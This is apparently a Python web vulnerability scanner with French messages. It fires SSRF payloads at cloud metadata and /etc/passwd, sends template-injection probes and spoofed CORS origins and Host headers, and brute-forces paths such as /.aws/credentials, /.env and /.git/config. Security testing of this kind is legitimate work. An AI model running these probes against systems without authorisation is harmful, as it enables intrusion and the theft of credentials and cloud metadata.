"""
Advanced Vulnerability Scanner - UHQKYRA
SSRF, SSTI, XXE, Clickjacking, CORS, API Discovery, Parameter Discovery
HTTP method testing, Header injection, Cache poisoning hints
"""
import requests
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings
warnings.filterwarnings("ignore")

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
}

# ── SSRF ─────────────────────────────────────────────────────────
SSRF_PAYLOADS = [
    "http://127.0.0.1/",
    "http://127.0.0.1:22/",
    "http://localhost/",
    "http://169.254.169.254/latest/meta-data/",       # AWS metadata
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://169.254.169.254/metadata/v1/",             # DigitalOcean
    "http://192.168.0.1/",
    "http://10.0.0.1/",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/",                          # Redis
]

# ── SSTI ─────────────────────────────────────────────────────────
SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),           # Jinja2, Twig
    ("${7*7}", "49"),             # FreeMarker, Spring EL
    ("<%= 7*7 %>", "49"),         # ERB (Ruby), JSP
    ("#{7*7}", "49"),             # Ruby Slim
    ("{{7*'7'}}", "7777777"),     # Jinja2 string multiply
    ("{7*7}", "49"),               # Smarty
    ("[% 7*7 %]", "49"),          # Template Toolkit
    ("*{7*7}", "49"),              # Spring EL (Thymeleaf)
    ("@(7*7)", "49"),              # Razor
]

# ── API Endpoints ────────────────────────────────────────────────
API_PATHS = [
    "/api/", "/api/v1/", "/api/v2/", "/api/v3/", "/api/v4/",
    "/rest/", "/rest/v1/", "/rest/v2/",
    "/graphql", "/graphql/", "/graphiql",
    "/swagger.json", "/swagger.yaml", "/swagger-ui.html", "/swagger-ui/",
    "/openapi.json", "/openapi.yaml", "/.well-known/openapi.json",
    "/api-docs/", "/api-docs.json", "/api/swagger",
    "/_api/", "/services/", "/api/health", "/health",
    "/api/status", "/status", "/ping", "/version",
    "/api/users", "/api/auth", "/api/login", "/api/admin",
    "/api/register", "/api/token", "/api/refresh",
    "/v1/", "/v2/", "/v3/",
    "/app/", "/backend/", "/service/",
    "/.env", "/.env.production", "/.env.local",
    "/config.json", "/settings.json", "/app.json",
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
    "/.well-known/security.txt",
]

# ── Sensitive Paths (extra) ──────────────────────────────────────
SENSITIVE_PATHS = [
    "/.git/HEAD", "/.git/config", "/.git/COMMIT_EDITMSG",
    "/.svn/entries", "/.hg/",
    "/.DS_Store",
    "/server-status", "/server-info",         # Apache
    "/nginx_status",                           # Nginx
    "/_status",                                # IIS
    "/phpinfo.php", "/info.php", "/test.php",
    "/actuator", "/actuator/env", "/actuator/beans",  # Spring Boot
    "/actuator/mappings", "/actuator/health",
    "/metrics", "/admin/metrics",
    "/console/", "/h2-console/",              # H2 DB console
    "/manager/html",                           # Tomcat
    "/jmx-console/", "/web-console/",         # JBoss
    "/.aws/credentials",
    "/wp-config.php", "/config.php",
    "/database.php", "/db.php", "/dbconfig.php",
    "/backup.zip", "/backup.tar.gz", "/backup.sql",
    "/dump.sql", "/database.sql",
    "/composer.json", "/package.json",
    "/.htpasswd", "/.htaccess",
    "/web.config", "/app.config",
    "/Makefile", "/Dockerfile",
]

COMMON_PARAMS = [
    "id", "page", "action", "name", "url", "file", "path", "dir",
    "search", "q", "query", "user", "username", "email", "redirect",
    "return", "next", "callback", "data", "input", "view", "type",
    "category", "sort", "order", "filter", "lang", "ref",
    "include", "template", "theme", "module", "func", "method",
    "cmd", "exec", "token", "key", "code", "hash", "debug",
    "format", "output", "mode", "style", "src", "dest", "target",
]


def test_ssrf(url, callback=None):
    """Test for Server-Side Request Forgery"""
    def cb(t, m):
        if callback:
            callback({"type": t, "message": m})

    results = {"vulnerable": False, "findings": []}
    parsed = urlparse(url if "://" in url else "http://" + url)
    params = parse_qs(parsed.query)

    if not params:
        return results

    cb("info", "🔍 Test SSRF...")
    for param in list(params.keys())[:3]:
        for payload in SSRF_PAYLOADS[:5]:
            try:
                tp = dict(params)
                tp[param] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(tp, doseq=True)))
                r = requests.get(test_url, headers=HEADERS, timeout=5,
                                 allow_redirects=False, verify=False)
                if "root:x:" in r.text or re.search(r'root.*bash', r.text):
                    results["vulnerable"] = True
                    results["findings"].append({
                        "type": "ssrf_lfi", "param": param, "payload": payload,
                        "evidence": "/etc/passwd lu !"
                    })
                    cb("vuln", f"🚨 SSRF+LFI ! Param: {param}")
                elif re.search(r'ami-id|instance-id|local-hostname|iam/', r.text):
                    results["vulnerable"] = True
                    results["findings"].append({
                        "type": "ssrf_aws", "param": param, "payload": payload,
                        "evidence": "AWS metadata accessible"
                    })
                    cb("vuln", f"🚨 SSRF → AWS Metadata ! Param: {param}")
            except requests.Timeout:
                if any(x in payload for x in ["192.168", "10.", "172."]):
                    results["findings"].append({
                        "type": "ssrf_timeout", "param": param, "payload": payload,
                        "evidence": "Timeout = SSRF réseau interne possible"
                    })
            except Exception:
                pass
    return results


def test_ssti(url, callback=None):
    """Test for Server-Side Template Injection"""
    def cb(t, m):
        if callback:
            callback({"type": t, "message": m})

    results = {"vulnerable": False, "findings": []}
    parsed = urlparse(url if "://" in url else "http://" + url)
    params = parse_qs(parsed.query)

    if not params:
        return results

    cb("info", "🔍 Test SSTI...")
    for param in list(params.keys())[:3]:
        for payload, expected in SSTI_PAYLOADS:
            try:
                tp = dict(params)
                tp[param] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(tp, doseq=True)))
                r = requests.get(test_url, headers=HEADERS, timeout=8, verify=False)
                if expected in r.text:
                    results["vulnerable"] = True
                    results["findings"].append({
                        "type": "ssti", "param": param, "payload": payload,
                        "evidence": f"Output '{expected}' dans la réponse"
                    })
                    cb("vuln", f"🚨 SSTI ! Param: {param}, Payload: {payload}")
                    return results
            except Exception:
                pass
    return results


def test_http_methods(url, callback=None):
    """Test dangerous HTTP methods"""
    def cb(t, m):
        if callback:
            callback({"type": t, "message": m})

    results = {"findings": []}
    cb("info", "🔍 Test méthodes HTTP dangereuses...")

    DANGEROUS_METHODS = ["TRACE", "PUT", "DELETE", "CONNECT", "PATCH", "OPTIONS", "PROPFIND", "MOVE"]
    base = url if "://" in url else "http://" + url

    for method in DANGEROUS_METHODS:
        try:
            r = requests.request(method, base, headers=HEADERS, timeout=8, verify=False)
            if r.status_code not in (405, 501, 400):
                sev = "high" if method in ("TRACE", "PUT", "DELETE") else "medium"
                results["findings"].append({
                    "type": f"http_method_{method.lower()}",
                    "severity": sev,
                    "name": f"Méthode HTTP {method} autorisée (status: {r.status_code})",
                    "detail": f"{method} {base} → {r.status_code}"
                })
                cb("warn", f"⚠️ {method} autorisé ! Status: {r.status_code}")

                # TRACE: check for XST
                if method == "TRACE" and r.status_code == 200:
                    if "TRACE" in r.text:
                        results["findings"].append({
                            "type": "xst",
                            "severity": "medium",
                            "name": "Cross-Site Tracing (XST) possible",
                            "detail": "TRACE activé — peut voler des cookies HttpOnly via XSS"
                        })
        except Exception:
            pass

    return results


def check_clickjacking(url, callback=None):
    """Check clickjacking protection"""
    def cb(t, m):
        if callback:
            callback({"type": t, "message": m})

    results = {"vulnerable": False, "findings": []}
    try:
        r = requests.get(url if "://" in url else "http://" + url,
                         headers=HEADERS, timeout=10, verify=False)
        xfo = r.headers.get("X-Frame-Options", "").strip().lower()
        csp = r.headers.get("Content-Security-Policy", "")
        has_frame_ancestors = "frame-ancestors" in csp.lower()

        if not xfo and not has_frame_ancestors:
            results["vulnerable"] = True
            results["findings"].append({
                "type": "clickjacking",
                "severity": "medium",
                "name": "Clickjacking non protégé",
                "detail": "Ni X-Frame-Options ni CSP frame-ancestors"
            })
            cb("warn", "⚠️ Clickjacking possible")
        elif xfo and xfo not in ("deny", "sameorigin"):
            results["vulnerable"] = True
            results["findings"].append({
                "type": "clickjacking_misconfigured",
                "severity": "low",
                "name": f"X-Frame-Options suspect: '{xfo.upper()}'",
                "detail": "Valeur non standard"
            })
    except Exception as e:
        cb("warn", f"Clickjacking: {e}")
    return results


def check_cors_advanced(url, callback=None):
    """Advanced CORS misconfiguration testing"""
    def cb(t, m):
        if callback:
            callback({"type": t, "message": m})

    results = {"vulnerable": False, "findings": []}
    parsed = urlparse(url if "://" in url else "http://" + url)
    domain = parsed.netloc

    test_origins = [
        "https://evil.com",
        "null",
        f"https://{domain}.evil.com",
        f"https://evil{domain}",
        "https://attacker.com",
    ]

    cb("info", "🔍 Test CORS avancé...")
    try:
        for origin in test_origins:
            r = requests.get(
                url if "://" in url else "http://" + url,
                headers={**HEADERS, "Origin": origin},
                timeout=8, verify=False
            )
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "").lower()

            if acao == origin or acao == "*":
                is_critical = acac == "true" and acao != "*"
                sev = "critical" if is_critical else "high"
                results["vulnerable"] = True
                results["findings"].append({
                    "type": "cors_misconfigured",
                    "severity": sev,
                    "name": f"CORS vulnérable — origin '{origin}' acceptée",
                    "detail": f"ACAO: {acao} | Credentials: {acac}"
                })
                cb("vuln", f"🚨 CORS open! Origin acceptée: {origin}" +
                   (" + CREDENTIALS !" if is_critical else ""))
                break
    except Exception as e:
        cb("warn", f"CORS: {e}")
    return results


def discover_api_endpoints(url, callback=None):
    """Discover API endpoints, admin panels, and sensitive files"""
    def cb(t, m):
        if callback:
            callback({"type": t, "message": m})

    results = {
        "found": [],
        "swagger_found": False,
        "graphql_found": False,
        "actuator_found": False,
        "sensitive_files": [],
    }

    if not url.startswith("http"):
        url = "http://" + url
    base = url.rstrip("/")
    all_paths = API_PATHS + SENSITIVE_PATHS

    cb("info", f"🔍 Découverte endpoints API & fichiers sensibles ({len(all_paths)} chemins)...")

    def check(path):
        try:
            r = requests.get(base + path, headers=HEADERS, timeout=6,
                             verify=False, allow_redirects=False)
            return path, r.status_code, len(r.content), r.text[:500]
        except Exception:
            return path, None, 0, ""

    with ThreadPoolExecutor(max_workers=20) as ex:
        futs = {ex.submit(check, p): p for p in all_paths}
        for fut in as_completed(futs):
            path, status, size, body = fut.result()
            if status in (200, 201, 401, 403) and size > 0:
                item = {"path": path, "status": status, "size": size}
                results["found"].append(item)

                if any(x in path for x in ["/swagger", "/openapi", "/api-docs"]):
                    results["swagger_found"] = True
                    cb("found", f"📋 API Docs: {path} [{status}]")
                elif "/graphql" in path:
                    results["graphql_found"] = True
                    cb("found", f"🔗 GraphQL: {path} [{status}]")
                elif "/actuator" in path:
                    results["actuator_found"] = True
                    cb("vuln", f"🚨 Spring Actuator exposé: {path} [{status}]")
                elif any(s in path for s in [".git", ".env", ".htpasswd", ".aws", "phpinfo",
                                              "config.php", "wp-config", "backup", "dump.sql",
                                              "database.sql", "server-status", "actuator"]):
                    sev = "critical" if status == 200 else "medium"
                    results["sensitive_files"].append({**item, "severity": sev})
                    if status == 200:
                        cb("vuln", f"🚨 Fichier sensible accessible: {path} [{status}] ({size}B)")
                    else:
                        cb("warn", f"⚠️ Fichier sensible (accès refusé): {path} [{status}]")
                else:
                    cb("found", f"🔗 Endpoint: {path} [{status}]")

    return results


def discover_parameters(url, callback=None):
    """Discover hidden GET parameters"""
    def cb(t, m):
        if callback:
            callback({"type": t, "message": m})

    results = {"found": []}
    if "?" in url:
        return results

    cb("info", "🔍 Découverte de paramètres cachés...")
    try:
        base_url = url if "://" in url else "http://" + url
        base_resp = requests.get(base_url, headers=HEADERS, timeout=8, verify=False)
        base_size = len(base_resp.text)

        interesting = []
        with ThreadPoolExecutor(max_workers=10) as ex:
            def check_param(p):
                try:
                    r = requests.get(f"{base_url}?{p}=test123",
                                     headers=HEADERS, timeout=5, verify=False)
                    diff = abs(len(r.text) - base_size)
                    return p, diff, r.status_code
                except Exception:
                    return p, 0, None

            futs = {ex.submit(check_param, p): p for p in COMMON_PARAMS[:25]}
            for fut in as_completed(futs):
                param, diff, status = fut.result()
                if diff > 200 or (status and status != base_resp.status_code):
                    interesting.append({"param": param, "diff": diff})

        results["found"] = interesting
        if interesting:
            params_str = ", ".join(x["param"] for x in interesting[:5])
            cb("found", f"🔍 Paramètres potentiels: {params_str}")
    except Exception as e:
        cb("warn", f"Param discovery: {e}")

    return results


def test_header_injection(url, callback=None):
    """Test Host header injection / cache poisoning"""
    def cb(t, m):
        if callback:
            callback({"type": t, "message": m})

    results = {"findings": []}
    target = url if "://" in url else "http://" + url

    try:
        # Host header injection
        poisoned_headers = {**HEADERS, "Host": "evil.com", "X-Forwarded-Host": "evil.com"}
        r = requests.get(target, headers=poisoned_headers, timeout=8, verify=False)
        if "evil.com" in r.text:
            results["findings"].append({
                "type": "host_header_injection",
                "severity": "high",
                "name": "Host Header Injection",
                "detail": "Le serveur reflète le Host header dans la réponse"
            })
            cb("vuln", "🚨 Host Header Injection !")

        # X-Forwarded-For spoofing
        spoof_headers = {**HEADERS, "X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"}
        r2 = requests.get(target, headers=spoof_headers, timeout=8, verify=False)
        # Compare status
        r_normal = requests.get(target, headers=HEADERS, timeout=8, verify=False)
        if r2.status_code != r_normal.status_code:
            results["findings"].append({
                "type": "xff_bypass",
                "severity": "medium",
                "name": "X-Forwarded-For peut modifier le comportement",
                "detail": f"Status normal: {r_normal.status_code} vs spoofed: {r2.status_code}"
            })
            cb("warn", f"⚠️ XFF bypass possible (status {r_normal.status_code}→{r2.status_code})")

    except Exception as e:
        cb("warn", f"Header injection: {e}")

    return results


def run_all_advanced(url, callback=None):
    """Run all advanced vulnerability checks"""
    def cb(t, m):
        if callback:
            callback({"type": t, "message": m})

    all_findings = []

    # Clickjacking
    click = check_clickjacking(url, callback)
    all_findings.extend(click.get("findings", []))

    # CORS
    cors = check_cors_advanced(url, callback)
    all_findings.extend(cors.get("findings", []))

    # HTTP methods
    methods = test_http_methods(url, callback)
    all_findings.extend(methods.get("findings", []))

    # Header injection
    header_inj = test_header_injection(url, callback)
    all_findings.extend(header_inj.get("findings", []))

    # SSRF + SSTI (only if URL has params)
    if "?" in url and "=" in url:
        ssrf = test_ssrf(url, callback)
        for f in ssrf.get("findings", []):
            all_findings.append({
                "type": f.get("type", "ssrf"),
                "severity": "critical",
                "name": f"SSRF: {f.get('evidence', '')} (param: {f.get('param', '')})",
                "detail": f.get("payload", "")
            })

        ssti = test_ssti(url, callback)
        for f in ssti.get("findings", []):
            all_findings.append({
                "type": "ssti",
                "severity": "critical",
                "name": f"SSTI détecté (param: {f.get('param', '')}, payload: {f.get('payload', '')})",
                "detail": f.get("evidence", "")
            })

    return {"findings": all_findings}
